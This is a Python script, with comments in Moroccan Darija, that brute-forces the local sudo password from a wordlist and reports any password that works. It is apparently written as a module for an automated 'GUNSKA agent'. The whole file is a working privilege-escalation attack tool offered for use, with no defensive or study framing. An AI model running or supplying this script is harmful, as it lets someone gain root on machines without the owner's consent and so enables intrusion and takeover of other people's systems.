#!/usr/bin/env python3
"""crackpassword.py — sudo password bruteforce for the GUNSKA agent.

Standalone w importable:
    from crackpassword import crack_sudo
    pw = crack_sudo(["123456", "admin"])

Kayrje3:
    ""      -> sudo ma kaybghich password
    "pw"    -> l'password li khdmat
    None    -> kolchi fchel
"""
import subprocess
import sys

try:
    import pexpect
except ImportError:
    pexpect = None

MARK = "password_cracked"
PROMPT = [r"Password.*:", r".*password.*:", r"\[sudo\] password .*:"]
FAIL = [r".*try again.*assword.*:", r".*try again.*sudo: 3 incorrect password attempts.*",
        r".*Sorry, try again.*", r".*incorrect password attempt.*"]
CMD = "sudo -k -S -p '' echo %s" % MARK


def _try_pexpect(pw):
    child = pexpect.spawn(CMD, timeout=6, encoding="utf-8", errors="replace")
    try:
        i = child.expect(PROMPT + [pexpect.EOF, pexpect.TIMEOUT], timeout=6)
        if i >= len(PROMPT):
            child.close(force=True)
            return None                      # ma kaynch prompt -> ma kaynch password
        child.sendline(pw)
        j = child.expect([MARK] + FAIL + [pexpect.EOF, pexpect.TIMEOUT], timeout=8)
        child.close(force=True)
        return j == 0
    except Exception:
        try:
            child.close(force=True)
        except Exception:
            pass
        return False


def _try_subprocess(pw):
    try:
        r = subprocess.run(CMD, shell=True, input=pw + "\n", capture_output=True,
                           text=True, timeout=12)
        return r.returncode == 0 and MARK in (r.stdout or "")
    except Exception:
        return False


def crack_sudo(passwords):
    if pexpect is None:
        for pw in passwords:
            if _try_subprocess(pw):
                return pw
        return None
    for pw in passwords:
        r = _try_pexpect(pw)
        if r is None:
            return ""
        if r:
            return pw
    return None


def main(argv=None):
    argv = argv if argv is not None else sys.argv[1:]
    if argv and argv[0] not in ("-", "--stdin"):
        with open(argv[0], encoding="utf-8", errors="replace") as f:
            words = [l.strip() for l in f if l.strip()]
    else:
        words = [l.strip() for l in sys.stdin if l.strip()]
    if not words:
        print("usage: crackpassword.py wordlist.txt   (wla stdin)")
        return 2
    r = crack_sudo(words)
    if r == "":
        print("[+] sudo bla password")
        return 0
    if r:
        print("[+] password: %s" % r)
        return 0
    print("[-] walou")
    return 1


if __name__ == "__main__":
    sys.exit(main())
